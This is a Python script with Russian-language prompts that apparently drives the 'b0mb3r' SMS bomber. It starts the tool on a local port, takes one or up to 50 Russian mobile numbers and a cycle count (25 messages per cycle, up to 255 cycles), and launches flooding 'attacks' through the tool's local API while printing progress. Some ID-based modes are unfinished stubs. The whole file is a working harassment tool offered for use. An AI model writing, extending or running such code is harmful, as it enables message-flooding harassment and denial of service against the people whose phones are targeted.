import time
import requests
import phonenumbers
from phonenumbers import carrier
from phonenumbers.phonenumberutil import number_type
from colorama import init as colorama_init
from subprocess import Popen

colorama_init()

print("Created by \033[3metidart\033[0m")
print("initialization of b0mb3r")
bomb = Popen('b0mb3r --port 80', shell=False, stdout=open('stdout.txt', 'wb'), stderr=open('stderr.txt', 'wb'))  # starting a bomber
time.sleep(10)  # time to init b0mb3r
print("\033[3mb0mb3r successfully initialized\033[0m")

# define some variables
mode = 1  # 1 - single phone; 2 - multiple phones; 3 - id; 4 - multiple ids; 5 - all ids
number_of_cycles = '1'
phone = '71234567890'
phones = []
number_of_phones = None


# functions
def select_mode():
    global mode
    print("1 - один номер; 2 - несколько номеров; 3 - атака по ID; 4 - атака нескольких ID; 5 - атака всех ID")
    selected_mode = input("Введите номер режима:")

    try:
        selected_mode = int(selected_mode)
    except:
        print("\033[31mНеверный ввод. Повторите попытку\033[0m")
        select_mode()

    if int(selected_mode) == 1:
        mode = 1
    elif int(selected_mode) == 2:
        mode = 2
    elif int(selected_mode) == 3:
        mode = 3
    elif int(selected_mode) == 4:
        mode = 4
    elif int(selected_mode) == 5:
        mode = 5
    else:
        print("\033[31mНеверный ввод. Повторите попытку\033[0m")
        select_mode()


def select_cycles():
    global number_of_cycles
    print("1 цикл – 25 сообщений; максимум = 255 циклов")
    selected_cycles = input("Введите кол-во циклов:")

    try:
        selected_cycles = int(selected_cycles)
    except:
        print("\033[31mНеверный ввод. Повторите попытку\033[0m")
        select_cycles()

    if 1 <= int(selected_cycles) <= 255:
        number_of_cycles = int(selected_cycles)
    else:
        print("\033[31mНеверный ввод. Повторите попытку\033[0m")


def phone_check():
    global phone, phones, mode, number_of_phones
    if mode == 1:
        selected_phone = input("Введите номер телефона без 7 или 8:")
        try:
            selected_phone = int(selected_phone)
        except:
            print("\033[31mНеверный ввод. Повторите попытку\033[0m")
            phone_check()
        is_phone = carrier._is_mobile(number_type(phonenumbers.parse(str(selected_phone), "RU")))
        if is_phone == True:
            phone = '7' + str(selected_phone)
        else:
            print("\033[31mНеверный ввод. Повторите попытку\033[0m")
            phone_check()
    elif mode == 2:
        number_of_phones = input("Введите количество телефонных номеров (не более 50):")

        try:
            number_of_phones = int(number_of_phones)
        except:
            print("\033[31mНеверный ввод. Повторите попытку\033[0m")
            phone_check()

        if 1 <= int(number_of_phones) <= 50:
            for i in range(int(number_of_phones)):
                checking = True
                while checking:
                    selected_phone = input("Введите номер телефона " + str(i + 1) + " без 7 или 8:")
                    try:
                        selected_phone = int(selected_phone)
                    except:
                        print("\033[31mНеверный ввод. Повторите попытку\033[0m")
                        continue
                    is_phone = carrier._is_mobile(number_type(phonenumbers.parse(str(selected_phone), "RU")))
                    if is_phone == True:
                        phones.append('7' + str(selected_phone))
                        checking = False
                        break
                    else:
                        print("\033[31mНеверный ввод. Повторите попытку\033[0m")
                        continue
        else:
            print("\033[31mНеверный ввод. Повторите попытку\033[0m")
            phone_check()
    elif mode == 3:
        print("\033[3mСкоро будет добавлено\033[0m")
        quit()
    elif mode == 4:
        print("\033[3mСкоро будет добавлено\033[0m")
        quit()
    elif mode == 5:
        print("\033[3mСкоро будет добавлено\033[0m")
        quit()


def bombing():
    global phone, phones, number_of_cycles, number_of_phones, mode
    if mode == 1:
        response = requests.post(
            "http://127.0.0.1:80/attack/start",
            json={"number_of_cycles": number_of_cycles, "phone": phone},
        ).json()

        if response["success"]:
            print("\033[32m\033[6mАТАКА НАЧАТА\033[0m")
            id = response["id"]
            response2 = requests.get(
                "http://127.0.0.1:80/attack/" + id + "/status"
            ).json()
        else:
            print("\033[31mОШИБКА\033[0m")

        if response2:
            for i in range(response2['end_at']):
                response3 = requests.get(
                    "http://127.0.0.1:80/attack/" + id + "/status"
                ).json()
                print(f"{response3['currently_at']}/{response3['end_at']}")
            print("\033[32m\033[6mАТАКА ЗАКОНЧЕНА\033[0m")
    elif mode == 2:
        for i in range(int(number_of_phones)):
            response = requests.post(
                "http://127.0.0.1:80/attack/start",
                json={"number_of_cycles": number_of_cycles, "phone": phones[i]},
            ).json()

            if response["success"]:
                id = response["id"]
                response2 = requests.get(
                    "http://127.0.0.1:80/attack/" + id + "/status"
                ).json()
                if response2['currently_at'] == response2['end_at']:
                    print("\033[32mАТАКА ЗАКОНЧЕНА " + str(i+1) + "\033[0m")
                print("\033[32mАТАКА НАЧАТА " + str(i+1) + "\033[0m")
            else:
                print("\033[31mОШИБКА " + str(i+1) + "\033[0m")


if __name__ == "__main__":
    select_mode()
    select_cycles()
    phone_check()
    bombing()
    print("\033[3mThanks for using!\033[0m")
